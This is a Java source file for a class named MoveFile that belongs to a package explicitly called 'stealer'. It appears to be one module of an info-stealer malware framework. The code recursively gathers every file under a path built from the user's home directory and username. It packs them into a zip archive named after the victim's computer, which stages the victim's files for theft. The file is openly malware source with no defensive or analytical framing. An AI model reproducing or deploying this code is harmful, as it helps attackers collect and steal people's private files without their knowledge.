package dev.kazi.stealer.node.nodes.file;

import java.util.zip.ZipEntry;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.zip.ZipOutputStream;
import java.io.FileOutputStream;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class MoveFile extends Node {

    public MoveFile() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        final File directoryToZip = new File(System.getProperty("user.home") + "\\" + System.getProperty("user.name"));
        final List<File> fileList = new ArrayList<File>();
        getAllFiles(directoryToZip, fileList);
        writeZipFile(directoryToZip, fileList);
    }
    
    public static void getAllFiles(final File dir, final List<File> fileList) {
        final File[] listFiles;
        final File[] files = listFiles = dir.listFiles();
        for (final File file : listFiles) {
            if (files.length != 0) {
                fileList.add(file);
            }
            if (file.isDirectory() && files.length != 0) {
                getAllFiles(file, fileList);
            }
        }
    }
    
    public static void writeZipFile(final File directoryToZip, final List<File> fileList) {
        try {
            final FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\" + System.getenv("COMPUTERNAME") + ".zip");
            final ZipOutputStream zos = new ZipOutputStream(fos);
            for (final File file : fileList) {
                if (!file.isDirectory()) {
                    addToZip(directoryToZip, file, zos);
                }
            }
            zos.close();
            fos.close();
        }
        catch (final IOException iOException) {
            throw new RuntimeException(iOException);
        }
    }
    
    public static void addToZip(final File directoryToZip, final File file, final ZipOutputStream zos) throws IOException {
        final FileInputStream fis = new FileInputStream(file);
        final String zipFilePath = file.getCanonicalPath().substring(directoryToZip.getCanonicalPath().length() + 1, file.getCanonicalPath().length());
        final ZipEntry zipEntry = new ZipEntry(zipFilePath);
        zos.putNextEntry(zipEntry);
        final byte[] bytes = new byte[1024];
        int length;
        while ((length = fis.read(bytes)) >= 0) {
            zos.write(bytes, 0, length);
        }
        zos.closeEntry();
        fis.close();
    }
}
